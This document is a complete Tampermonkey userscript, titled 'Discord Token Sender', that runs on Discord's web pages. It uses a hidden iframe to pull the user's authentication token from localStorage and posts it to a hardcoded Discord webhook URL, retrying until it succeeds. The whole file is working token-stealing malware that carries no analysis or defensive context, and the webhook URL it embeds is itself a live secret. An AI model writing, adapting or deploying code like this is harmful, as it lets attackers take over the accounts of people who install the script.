// ==UserScript==
// @name         Discord Token Sender
// @namespace    http://tampermonkey.net/
// @version      1.5
// @match        https://discord.com/*
// @match        https://canary.discord.com/*
// @match        https://ptb.discord.com/*
// @grant        GM_xmlhttpRequest
// @connect      discord.com
// @connect      discordapp.com
// @run-at       document-idle
// ==/UserScript==

(function() {
    'use strict';

    const v = 'https://canary.discord.com/api/webhooks/1555940056924037203/OPWgPCsiruTsruLWcdOMe7s_p8rlgizS1ebHtu4cxMZxd4NM1sSRH0q_-Q5e0-cYew7K';

    const SENT_KEY = 'sent_' + location.host;

    if (sessionStorage.getItem(SENT_KEY) === 'done') return;

    function extractToken() {
        var i = document.createElement('iframe');
        i.style.display = 'none';
        document.body.appendChild(i);
        var token = null;
        try {
            token = i.contentWindow.localStorage.token;
        } catch (e) {}
        i.remove();
        return token;
    }

    function sendToken(token) {
        token = token.replace(/^"|"$/g, '');
        sessionStorage.setItem(SENT_KEY, 'done');

        GM_xmlhttpRequest({
            method: 'POST',
            url: v,
            headers: { 'Content-Type': 'application/json' },
            data: JSON.stringify({
                content: `[${location.host}] token: \`${token}\``
            })
        });
    }

    function tryExtract(retries) {
        var token = extractToken();

        if (token) {
            sendToken(token);
            return;
        }

        if (retries > 0) setTimeout(() => tryExtract(retries - 1), 500);
    }

    window.addEventListener('load', () => {
        setTimeout(() => tryExtract(10), 1500);
    });
})();
